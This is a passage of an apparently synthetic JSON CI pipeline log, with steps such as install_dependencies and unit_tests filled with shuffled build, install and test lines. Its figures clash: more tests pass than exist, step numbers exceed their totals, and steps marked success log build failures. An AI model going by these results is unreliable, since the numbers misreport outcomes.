          "[12:17:40] INFO: Connecting to database",
          "NODE_ENV=production",
          "Exception: RuntimeError",
          "Connection established",
          "Cache hit for key-8190",
          "NODE_ENV=development",
          "pip install: Successfully installed prettier-3.14",
          "[12:17:40] DEBUG: Initializing service",
          "\u2717 build failed with exit code 24",
          "HEAD is now at a6fb4a4",
          "Test Suites: 30 passed, 8 total",
          "[12:17:40] WARN: Deprecated API usage",
          "pip: Collecting lodash",
          "Step 9/15: Running migrations",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "Connection established",
          "Connection established",
          "Creating production build...",
          "[12:17:40] DEBUG: Connection pool: 16 active",
          "Cache miss for key-4600",
          "Cache saved successfully",
          "Artifact downloaded: 50MB",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (31MB)",
          "Time: 15.608s",
          "TLS handshake completed",
          "Time: 18.348s",
          "Already up to date.",
          "Compiling utils/index.js...",
          "Using Python 3.10",
          "Verifying...",
          "Cache hit for key-3101",
          "Artifact uploaded: dist.zip (11MB)",
          "Environment: test",
          "Environment: test",
          "Step 4/25: Testing",
          "Uploading artifact 'coverage' (21 files)",
          "HEAD is now at 3a14ec1",
          "Compiling components/main.py...",
          "npm notice: created a lockfile",
          "Compiling utils/main.py...",
          "Cache restored successfully (76MB)",
          "[12:17:40] DEBUG: Loading configuration",
          "Finished.",
          "Compiling utils/handler.rs...",
          "Success!",
          "Finished.",
          "Minifying main.js",
          "[12:17:40] INFO: Cache refreshed",
          "[12:17:40] DEBUG: Connection pool: 19 active",
          "[12:17:40] INFO: Processing request",
          "Platform: darwin-arm64",
          "pip install: Successfully installed axios-1.17",
          "[12:17:40] INFO: Request completed",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Pulling image: node:3.11",
          "  PASS: e2e/test_auth_login.spec.js",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 20/25: Installing dependencies",
          "Waiting...",
          "Snapshots: 14 passed, 10 total",
          "Bundling styles.js",
          "Using Node.js 17.5.6",
          "Processing...",
          "npm notice: created a lockfile",
          "Test Suites: 9 passed, 26 total",
          "Pushing to registry...",
          "\u2713 Task completed in 899ms",
          "[12:17:40] ERROR: Connection failed",
          "Checking out main branch",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "[12:17:40] INFO: Request completed",
          "HEAD is now at 9519eb8",
          "Cache saved successfully",
          "[12:17:40] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Using Python 3.12",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:17:40] INFO: Processing request",
          "Pulling image: node:latest",
          "Layer 7/15: ENV command",
          "Connecting to test.io:443...",
          "Verifying...",
          "HEAD is now at e24a3d0",
          "Test Suites: 18 passed, 27 total",
          "[12:17:40] DEBUG: Connection pool: 4 active",
          "Cache saved successfully",
          "HEAD is now at fa21a80",
          "Ready.",
          "[12:17:40] DEBUG: Connection pool: 10 active",
          "WARNING: jest has known vulnerabilities",
          "[12:17:40] DEBUG: Initializing service",
          "Switched to branch 'bugfix/task-471'",
          "Minifying vendor.js",
          "[12:17:40] DEBUG: Loading configuration",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-24T12:18:09.037633",
        "finished_at": "2025-11-24T12:18:30.591965",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Ran 44 tests in 7s",
          "Ran 154 tests in 23s",
          "Checking out develop branch",
          "Exception: RuntimeError",
          "Snapshots: 41 passed, 10 total",
          "\u2713 Task completed in 662ms",
          "[12:17:40] DEBUG: Initializing service",
          "Transforming 150 files...",
          "[12:17:40] ERROR: Connection failed",
          "NODE_ENV=test",
          "Waiting...",
          "[12:17:40] INFO: Connecting to database",
          "Minifying vendor.js",
          "Bundling vendor.css",
          "Compiling src/handler.rs...",
          "Compiling utils/service.java...",
          "Connecting to cloud.services:443...",
          "Success!",
          "yarn add: Done in 14.65s",
          "WARNING: react has known vulnerabilities",
          "npm install: resolved 1126 packages",
          "Generating source maps...",
          "Cache saved successfully",
          "[12:17:40] INFO: Starting build process",
          "Generating source maps...",
          "pip: Downloading webpack-1.3.tar.gz",
          "Artifact downloaded: 14MB",
          "[12:17:40] INFO: Processing request",
          "Completed.",
          "Compiling utils/app.ts...",
          "Generating source maps...",
          "[12:17:40] INFO: Request completed",
          "Artifact downloaded: 11MB",
          "Snapshots: 38 passed, 10 total",
          "npm install: added 67 packages",
          "pip: Collecting prettier",
          "Verifying...",
          "Success!",
          "[12:17:40] INFO: Starting build process",
          "Compiling src/index.js...",
          "[12:17:40] DEBUG: Memory usage: 313MB",
          "Building Docker image...",
          "Using Node.js 14.13.8",
          "Cache invalidated: node_modules",
          "Fetching submodules...",
          "Finished.",
          "\u2717 build failed with exit code 33",
          "Loading...",
          "Environment: development",
          "NODE_ENV=production",
          "Step 19/16: Installing dependencies",
          "npm notice: created a lockfile",
          "OK",
          "Step 1/22: Running migrations",
          "Exception: RuntimeError",
          "[12:17:40] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out master branch",
          "pip install: Successfully installed react-3.10",
          "Creating production build...",
          "Waiting...",
          "Minifying app.js",
          "[12:17:40] INFO: Request completed",
          "Success!",
          "WARNING: prettier has known vulnerabilities",
          "[12:17:40] INFO: Request completed",
          "pip install: Successfully installed lodash-5.11",
          "Compiling src/main.py...",
          "TLS handshake completed",
          "Step 3/21: Building",
          "Compiling utils/utils.go...",
          "[12:17:40] DEBUG: Initializing service",
          "FAILED: test_cache_hit",
          "Connecting to example.com:443...",
          "Artifact uploaded: dist.zip (57MB)",
          "pip: Installing build dependencies...",
          "Cache hit for key-5752",
          "Step 4/17: Testing",
          "Connecting to startup.dev:443...",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "OK",
          "yarn add: Done in 8.28s",
          "[12:17:40] DEBUG: Connection pool: 1 active",
          "Pulling image: node:3.11",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:17:40] DEBUG: Query executed in 29ms",
          "Step 12/19: Installing dependencies",
          "Artifact uploaded: build.tar.gz (7MB)",
          "GET /health - 200 (29ms)",
          "Connection established",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:17:40] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "Waiting...",
          "[12:17:40] ERROR: Connection failed",
          "Using Node.js 17.20.9",
          "[12:17:40] ERROR: Connection failed",
          "Ran 19 tests in 15s",
          "Fetching submodules...",
          "Coverage: 84% statements, 64% branches",
          "npm install: added 240 packages",
          "Uploading artifact 'build' (43 files)",
          "Already up to date.",
          "TLS handshake completed",
          "Platform: darwin-arm64",
          "Optimizing 25 modules...",
          "Generating source maps...",
          "npm install: added 463 packages",
          "Minifying vendor.js",
          "Compiling lib/service.java...",
          "Bundling main.css",
          "Connection established",
          "Checking out main branch",
          "Creating production build...",
          "Coverage: 94% statements, 70% branches",
          "Minifying app.js",
          "Platform: linux-x64",
          "Connecting to startup.dev:443...",
          "[12:17:40] DEBUG: Memory usage: 1270MB",
          "Generating source maps...",
          "[12:17:40] INFO: Cache refreshed",
          "Coverage: 85% statements, 98% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Compiling components/app.ts...",
          "[12:17:40] INFO: Starting build process",
          "Connecting to example.com:443...",
          "Artifact uploaded: dist.zip (29MB)",
          "npm install: resolved 1916 packages",
          "[12:17:40] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Cache hit for key-6492",
          "Minifying vendor.js",
          "Environment: production",
          "Ready.",
          "  PASS: e2e/test_cache_hit.spec.js",
          "yarn add: Done in 12.98s",
          "Cache hit for key-5463",
          "Cache restored successfully (368MB)",
          "\u2713 All checks passed",
          "Success!",
          "\u2713 Task completed in 3414ms",
          "Using Python 3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:17:40] INFO: Connecting to database",
          "Tests: 214 passed, 183 total",
          "WARNING: axios has known vulnerabilities",
          "NODE_ENV=development",
          "Installing jest@5.16.5",
          "  PASS: unit/test_user_create.spec.js",
          "Pulling image: python:18",
          "Environment: development",
          "Artifact uploaded: dist.zip (45MB)",
          "[12:17:40] DEBUG: Connection pool: 9 active",
          "[12:17:40] INFO: Starting build process",
          "  PASS: integration/test_api_health.spec.js",
          "OK",
          "yarn add: Done in 27.31s",
          "Waiting...",
          "[12:17:40] DEBUG: Initializing service",
          "Cache saved successfully",
          "Ready.",
          "Transforming 922 files...",
          "Verifying...",
          "Bundling styles.css",
          "Exception: RuntimeError",
          "HEAD is now at e31d099",
          "  PASS: unit/test_auth_login.spec.js",
          "WARNING: eslint has known vulnerabilities",
          "Already up to date.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-24T12:18:30.591965",
        "finished_at": "2025-11-24T12:18:37.776742",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache invalidated: dependencies",
          "Bundling runtime.css",
          "Step 8/16: Testing",
          "Waiting...",
          "Ready.",
          "OK",
          "npm notice: package.json updated",
          "HEAD is now at eca3add",
          "Waiting...",
          "Compiling components/handler.rs...",
          "Ran 162 tests in 15s",
          "[12:17:40] WARN: Deprecated API usage",
          "Connection established",
          "Compiling components/handler.rs...",
          "Installing prettier@5.11.7",
          "[12:17:40] DEBUG: Initializing service",
          "[12:17:40] INFO: Connecting to database",
          "[12:17:40] DEBUG: Initializing service",
          "Bundling styles.css",
          "Step 2/24: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:17:40] INFO: Processing request",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: dist.zip (9MB)",
          "Pulling image: python:latest",
          "Compiling utils/handler.rs...",
          "Cache saved successfully",
          "Transforming 469 files...",
          "Optimizing 47 modules...",
          "Waiting...",
          "[12:17:40] DEBUG: Memory usage: 1222MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling utils/service.java...",
          "Step 11/25: Linting",
          "Compiling components/app.ts...",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: created a lockfile",
          "Optimizing 34 modules...",
          "\u2713 Task completed in 3528ms",
          "npm notice: created a lockfile",
          "[12:17:40] DEBUG: Loading configuration",
          "Checking out main branch",
          "pip install: Successfully installed lodash-1.12",
          "\u2713 All checks passed",
          "GET /status - 200 (42ms)",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Waiting...",
          "Minifying main.js",
          "Done.",
          "TLS handshake completed",
          "[12:17:40] INFO: Request completed",
          "Step 11/20: Running migrations",
          "\u2713 All checks passed",
          "Connection established",
          "npm notice: package.json updated",
          "Snapshots: 13 passed, 40 total",
          "Completed.",
          "Ran 166 tests in 40s",
          "[12:17:40] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'hotfix/task-690'",
          "Cache restored successfully (240MB)",
          "pip: Installing build dependencies...",
          "Installing jest@1.17.7",
          "Success!",
          "[12:17:40] INFO: Cache refreshed",
          "Layer 4/14: ENV command",
          "Pushing to registry...",
          "Step 9/20: Building",
          "Cache invalidated: dependencies",
          "Connection established",
          "Pulling image: node:3.11",
          "Test Suites: 31 passed, 19 total",
          "Artifact downloaded: 18MB",
          "NODE_ENV=test",
          "[12:17:40] DEBUG: Initializing service",
          "TLS handshake completed",
          "[12:17:40] INFO: Connecting to database",
          "Processing...",
          "POST /upload - 202 (317ms)",
          "\u2713 validate completed",
          "Coverage: 94% statements, 91% branches",
          "Step 5/16: Running migrations",
          "Image pulled successfully",
          "Layer 7/9: ENV command",
          "[12:17:40] DEBUG: Connection pool: 4 active",
          "[12:17:40] INFO: Request completed",
          "pip install: Successfully installed express-1.11",
          "Artifact uploaded: dist.zip (58MB)",
          "Ran 179 tests in 19s",
          "Cache miss for key-6672",
          "\u2713 Task completed in 3978ms",
          "Cache hit for key-4883",
          "pip: Downloading prettier-2.20.tar.gz",
          "Uploading artifact 'coverage' (31 files)",
          "TLS handshake completed",
          "Step 4/20: Running migrations",
          "Step 10/23: Building",
          "Compiling components/handler.rs...",
          "Exception: TypeError",
          "Cache miss for key-5943",
          "Step 14/17: Linting",
          "Step 5/18: Deploying",
          "Compiling lib/handler.rs...",
          "pip: Installing build dependencies...",
          "Ready.",
          "[12:17:40] ERROR: Connection failed",
          "Uploading artifact 'dist' (45 files)",
          "Artifact downloaded: 9MB",
          "WARNING: react has known vulnerabilities",
          "\u2713 Task completed in 642ms",
          "Installing prettier@1.18.4",
          "Artifact uploaded: build.tar.gz (3MB)",
          "npm install: resolved 1698 packages",
          "\u2713 All checks passed",
          "Using Node.js 18.8.3",
          "Cache restored successfully (212MB)",
          "Checking out develop branch",
          "Loading...",
          "Completed.",
          "Artifact uploaded: dist.zip (55MB)",
          "Cache miss for key-4478",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:40] DEBUG: Memory usage: 1771MB",
          "Step 4/18: Testing",
          "Step 16/17: Installing dependencies",
          "Coverage: 80% statements, 92% branches",
          "GET /health - 201 (95ms)",
          "\u2713 All checks passed",
          "\u2713 test completed",
          "Cache restored successfully (401MB)",
          "Cache invalidated: build",
          "[12:17:40] DEBUG: Connection pool: 17 active",
          "[12:17:40] WARN: Deprecated API usage",
          "Completed.",
          "[12:17:40] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Loading...",
          "Pushing to registry...",
          "Compiling utils/main.py...",
          "Cache restored successfully (319MB)",
          "Optimizing 16 modules...",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] INFO: Processing request",
          "pip install: Successfully installed axios-1.9",
          "Waiting...",
          "Done.",
          "Success!",
          "Test Suites: 32 passed, 27 total",
          "Generating source maps...",
          "POST /data - 201 (141ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Processing...",
          "pip: Installing build dependencies...",
          "Loading...",
          "npm notice: package.json updated",
          "[12:17:40] INFO: Request completed",
          "Tests: 335 passed, 220 total",
          "\u2713 Task completed in 2729ms",
          "Test Suites: 39 passed, 12 total",
          "OK",
          "Artifact uploaded: dist.zip (76MB)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:17:40] ERROR: Connection failed",
          "pip: Collecting webpack",
          "Step 6/23: Deploying",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-24T12:18:37.776742",
        "finished_at": "2025-11-24T12:18:44.961519",
        "log_lines": [
          "=== Step: type_check ===",
          "Ready.",
          "\u2713 Task completed in 3249ms",
          "Completed.",
          "[12:17:40] INFO: Cache refreshed",
          "POST /api - 202 (485ms)",
          "Cache restored successfully (383MB)",
          "HEAD is now at 0cd43ca",
          "Installing lodash@5.16.3",
          "Compiling utils/utils.go...",
          "Cache invalidated: node_modules",
          "Already up to date.",
          "pip install: Successfully installed lodash-1.0",
          "Cache restored successfully (222MB)",
          "Installing eslint@3.20.0",
          "Loading...",
          "Ready.",
          "Platform: linux-x64",
          "Fetching submodules...",
          "[12:17:40] INFO: Starting build process",
          "pip install: Successfully installed axios-5.17",
          "Test Suites: 7 passed, 18 total",
          "pip: Collecting eslint",
          "Pulling image: python:latest",
          "Transforming 400 files...",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Compiling components/service.java...",
          "Test Suites: 44 passed, 5 total",
          "Coverage: 70% statements, 86% branches",
          "Using Python 3.9",
          "npm notice: package.json updated",
          "Completed.",
          "Layer 7/10: ENV command",
          "Compiling utils/utils.go...",
          "Platform: win32-x64",
          "Using Node.js 19.15.0",
          "pip install: Successfully installed axios-5.20",
          "Cache restored successfully (28MB)",
          "Generating source maps...",
          "npm notice: package.json updated",
          "  PASS: test_auth_login (226ms)",
          "[12:17:40] INFO: Request completed",
          "npm install: resolved 489 packages",
          "\u2713 All checks passed",
          "FAILED: test_api_health",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "Completed.",
          "Step 4/16: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 88 tests in 39s",
          "Step 1/16: Building",
          "npm install: added 308 packages",
          "[12:17:40] DEBUG: Loading configuration",
          "[12:17:40] DEBUG: Query executed in 62ms",
          "NODE_ENV=development",
          "Pushing to registry...",
          "Artifact downloaded: 19MB",
          "Compiling utils/utils.go...",
          "HEAD is now at 3db834a",
          "npm notice: package.json updated",
          "Snapshots: 1 passed, 10 total",
          "npm install: added 266 packages",
          "Using Node.js 14.9.5",
          "[12:17:40] DEBUG: Query executed in 24ms",
          "Compiling utils/index.js...",
          "Step 5/17: Installing dependencies",
          "Building Docker image...",
          "Artifact downloaded: 45MB",
          "[12:17:40] DEBUG: Memory usage: 168MB",
          "Compiling components/service.java...",
          "[12:17:40] DEBUG: Memory usage: 1518MB",
          "Fetching submodules...",
          "[12:17:40] INFO: Request completed",
          "Compiling lib/app.ts...",
          "Connection established",
          "Compiling components/utils.go...",
          "\u2713 package completed",
          "Fetching submodules...",
          "[12:17:40] INFO: Connecting to database",
          "Step 20/24: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "Ran 95 tests in 33s",
          "TLS handshake completed",
          "Step 10/25: Installing dependencies",
          "[12:17:40] DEBUG: Memory usage: 1553MB",
          "Fetching submodules...",
          "Pulling image: python:latest",
          "Environment: staging",
          "POST /upload - 201 (212ms)",
          "Artifact downloaded: 42MB",
          "Step 4/25: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "Cache hit for key-8559",
          "Connecting to startup.dev:443...",
          "[12:17:40] WARN: Deprecated API usage",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "Using Python 3.12",
          "Cache saved successfully",
          "Pushing to registry...",
          "[12:17:40] INFO: Request completed",
          "Cache invalidated: node_modules",
          "Cache saved successfully",
          "TLS handshake completed",
          "Compiling utils/app.ts...",
          "GET /health - 200 (97ms)",
          "[12:17:40] DEBUG: Memory usage: 1386MB",
          "Verifying...",
          "[12:17:40] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: TypeError",
          "Finished.",
          "Compiling utils/utils.go...",
          "Cache restored successfully (113MB)",
          "[12:17:40] DEBUG: Connection pool: 5 active",
          "HEAD is now at bcb3d0e",
          "[12:17:40] DEBUG: Memory usage: 1585MB",
          "WARNING: lodash has known vulnerabilities",
          "[12:17:40] DEBUG: Query executed in 89ms",
          "Step 6/21: Deploying",
          "Time: 56.70s",
          "Installing prettier@3.17.10",
          "Artifact downloaded: 8MB",
          "Processing...",
          "Environment: development",
          "NODE_ENV=test",
          "Step 1/22: Running migrations",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:40] WARN: Deprecated API usage",
          "yarn add: Done in 13.37s",
          "[12:17:40] INFO: Processing request",
          "Cache invalidated: node_modules",
          "[12:17:40] INFO: Request completed",
          "Already up to date.",
          "Completed.",
          "[12:17:40] INFO: Starting build process",
          "Already up to date.",
          "TLS handshake completed",
          "Already up to date.",
          "Using Node.js 16.16.5",
          "\u2713 All checks passed",
          "Step 13/21: Running migrations",
          "Step 1/20: Testing",
          "[12:17:40] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Optimizing 16 modules...",
          "[12:17:40] INFO: Connecting to database",
          "Cache hit for key-2292",
          "  PASS: e2e/test_auth_login.spec.js",
          "Installing lodash@2.9.3",
          "Completed.",
          "TLS handshake completed",
          "Artifact downloaded: 3MB",
          "Image pulled successfully",
          "Step 1/25: Building",
          "[12:17:40] WARN: Deprecated API usage",
          "Optimizing 81 modules...",
          "Snapshots: 5 passed, 8 total",
          "[12:17:40] INFO: Request completed",
          "[12:17:40] INFO: Processing request",
          "Test Suites: 37 passed, 39 total",
          "  PASS: test_api_health (111ms)",
          "Test Suites: 25 passed, 23 total",
          "GET /status - 200 (28ms)",
          "NODE_ENV=development",
          "Step 3/24: Installing dependencies",
          "Generating source maps...",
          "\u2717 build failed with exit code 102",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-24T12:18:44.961519",
        "finished_at": "2025-11-24T12:18:52.146296",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Tests: 102 passed, 355 total",
          "[12:17:40] INFO: Request completed",
          "\u2717 build failed with exit code 125",
          "[12:17:40] DEBUG: Connection pool: 11 active",
          "pip: Downloading prettier-3.7.tar.gz",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Artifact downloaded: 21MB",
          "pip: Collecting webpack",
          "POST /upload - 201 (175ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "pip install: Successfully installed express-4.0",
          "Step 10/23: Building",
          "npm install: added 196 packages",
          "npm notice: created a lockfile",
          "Time: 76.28s",
          "Compiling src/handler.rs...",
          "pip: Downloading jest-2.1.tar.gz",
          "Cache restored successfully (496MB)",
          "Already up to date.",
          "Test Suites: 26 passed, 43 total",
          "Using Node.js 16.4.2",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "Time: 27.655s",
          "Cache miss for key-2095",
          "Connection established",
          "[12:17:40] INFO: Request completed",
          "GET /api - 201 (86ms)",
          "Bundling vendor.js",
          "Environment: staging",
          "Using Node.js 15.18.0",
          "POST /data - 202 (274ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 11/24: Testing",
          "Snapshots: 38 passed, 25 total",
          "\u2717 build failed with exit code 112",
          "[12:17:40] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "[12:17:40] DEBUG: Memory usage: 1392MB",
          "Compiling lib/service.java...",
          "npm install: added 234 packages",
          "Ran 37 tests in 18s",
          "\u2713 Task completed in 1596ms",
          "Loading...",
          "Step 19/25: Deploying",
          "Completed.",
          "Connecting to acme.corp:443...",
          "\u2713 validate completed",
          "[12:17:40] INFO: Connecting to database",
          "Optimizing 59 modules...",
          "[12:17:40] DEBUG: Connection pool: 7 active",
          "Processing...",
          "pip: Downloading webpack-5.13.tar.gz",
          "[12:17:40] ERROR: Connection failed",
          "[12:17:40] INFO: Processing request",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:40] DEBUG: Memory usage: 1572MB",
          "Waiting...",
          "Bundling main.js",
          "pip: Collecting axios",
          "Environment: development",
          "Step 13/23: Building",
          "Step 17/24: Deploying",
          "yarn add: Done in 2.24s",
          "[12:17:40] DEBUG: Query executed in 22ms",
          "Test Suites: 47 passed, 19 total",
          "Done.",
          "Cache restored successfully (92MB)",
          "Completed.",
          "Waiting...",
          "Cache restored successfully (443MB)",
          "Processing...",
          "pip: Collecting axios",
          "npm install: resolved 144 packages",
          "[12:17:40] INFO: Starting build process",
          "Time: 34.671s",
          "Creating production build...",
          "Done.",
          "Compiling components/service.java...",
          "[12:17:40] DEBUG: Initializing service",
          "Artifact downloaded: 47MB",
          "[12:17:40] WARN: Deprecated API usage",
          "  PASS: unit/test_auth_login.spec.js",
          "Artifact uploaded: dist.zip (4MB)",
          "Done.",
          "\u2713 Step 'setup' succeeded",
          "Step 2/23: Deploying",
          "pip: Collecting prettier",
          "Artifact uploaded: dist.zip (39MB)",
          "npm notice: created a lockfile",
          "Loading...",
          "\u2713 Task completed in 2733ms",
          "Cache saved successfully",
          "Snapshots: 25 passed, 40 total",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Already up to date.",
          "[12:17:40] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Processing...",
          "Uploading artifact 'dist' (16 files)",
          "Waiting...",
          "TLS handshake completed",
          "Cache invalidated: dependencies",
          "WARNING: react has known vulnerabilities",
          "\u2713 Task completed in 4208ms",
          "HEAD is now at 5760a1e",
          "[12:17:40] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 75",
          "Connection established",
          "OK",
          "[12:17:40] DEBUG: Loading configuration",
          "Tests: 83 passed, 294 total",
          "npm notice: package.json updated",
          "[12:17:40] INFO: Request completed",
          "Artifact uploaded: dist.zip (34MB)",
          "\u2713 package completed",
          "Layer 2/8: ENV command",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "Installing react@3.18.0",
          "Transforming 172 files...",
          "[12:17:40] INFO: Cache refreshed",
          "Platform: win32-x64",
          "OK",
          "[12:17:40] DEBUG: Loading configuration",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 9/15: Testing",
          "  PASS: e2e/test_api_health.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Switched to branch 'bugfix/task-413'",
          "Compiling utils/main.py...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 12/22: Linting",
          "Checking out master branch",
          "Step 10/25: Deploying",
          "Compiling utils/handler.rs...",
          "Connection established",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Finished.",
          "Layer 7/12: COPY command",
          "  PASS: test_cache_hit (300ms)",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:17:40] WARN: Deprecated API usage",
          "[12:17:40] ERROR: Connection failed",
          "  PASS: test_cache_hit (112ms)",
          "Loading...",
          "Compiling utils/app.ts...",
          "Uploading artifact 'coverage' (46 files)",
          "pip: Collecting eslint",
          "Connecting to startup.dev:443...",
          "Loading...",
          "\u2717 build failed with exit code 108",
          "Checking out main branch",
          "WARNING: express has known vulnerabilities",
          "Switched to branch 'bugfix/task-491'",
          "Exception: TypeError",
          "Switched to branch 'hotfix/task-902'",
          "Using Node.js 20.4.6",
          "GET /health - 204 (33ms)",
          "FAILED: test_user_create",
          "GET /status - 201 (37ms)",
          "WARNING: axios has known vulnerabilities",
          "Generating source maps...",
          "Ran 33 tests in 1s",
          "Step 13/17: Running migrations",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-24T12:18:52.146296",
        "finished_at": "2025-11-24T12:19:13.700628",
        "log_lines": [
          "=== Step: unit_tests ===",
          "TLS handshake completed",
          "pip install: Successfully installed eslint-5.0",
          "pip: Installing build dependencies...",
          "Finished.",
          "[12:17:40] WARN: Deprecated API usage",
          "Loading...",
          "Minifying main.js",
          "Pushing to registry...",
          "Checking out master branch",
          "Verifying...",
          "HEAD is now at fb1b651",
          "Compiling lib/handler.rs...",
          "Environment: production",
          "Completed.",
          "[12:17:40] ERROR: Connection failed",
          "Completed.",
          "Connection established",
          "TLS handshake completed",
          "yarn add: Done in 17.48s",
          "Cache saved successfully",
          "GET /api - 204 (4ms)",
          "Loading...",
          "[12:17:40] INFO: Cache refreshed",
          "[12:17:40] DEBUG: Initializing service",
          "Platform: darwin-arm64",
          "Minifying app.js",
          "npm install: resolved 114 packages",
          "\u2713 Step 'test' succeeded",
          "[12:17:40] INFO: Starting build process",
          "Cache miss for key-6894",
          "WARNING: express has known vulnerabilities",
          "[12:17:40] INFO: Connecting to database",
          "Ran 44 tests in 22s",
          "Compiling components/app.ts...",
          "Finished.",
          "Optimizing 55 modules...",
          "[12:17:40] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: python:18",
          "Ran 80 tests in 25s",
          "  PASS: unit/test_db_connect.spec.js",
          "\u2713 validate completed",
          "Installing prettier@5.14.7",
          "Installing jest@1.6.1",
          "Coverage: 93% statements, 89% branches",
          "Layer 8/9: COPY command",
          "\u2713 deploy completed",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:17:40] DEBUG: Query executed in 50ms",
          "Switched to branch 'bugfix/task-305'",
          "WARNING: express has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "TLS handshake completed",
          "[12:17:40] DEBUG: Query executed in 33ms",
          "Tests: 266 passed, 239 total",
          "[12:17:40] ERROR: Connection failed",
          "OK",
          "Step 20/23: Building",
          "Tests: 369 passed, 267 total",
          "Bundling vendor.js",
          "Ran 127 tests in 26s",
          "Cache saved successfully",
          "pip install: Successfully installed eslint-3.0",
          "\u2713 Task completed in 354ms",
          "Bundling runtime.js",
          "NODE_ENV=production",
          "[12:17:40] INFO: Cache refreshed",
          "Step 12/25: Building",
          "Layer 10/9: COPY command",
          "NODE_ENV=test",
          "Step 8/21: Deploying",
          "[12:17:40] DEBUG: Memory usage: 307MB",
          "Fetching submodules...",
          "Coverage: 77% statements, 89% branches",
          "Using Python 3.9",
          "Time: 77.228s",
          "Step 1/17: Installing dependencies",
          "Done.",
          "Layer 5/10: ENV command",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:17:40] INFO: Starting build process",
          "POST /data - 200 (352ms)",
          "[12:17:40] DEBUG: Connection pool: 7 active",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Optimizing 32 modules...",
          "Fetching submodules...",
          "[12:17:40] INFO: Request completed",
          "Bundling main.js",
          "\u2713 All checks passed",
          "Tests: 117 passed, 98 total",
          "Cache miss for key-7566",
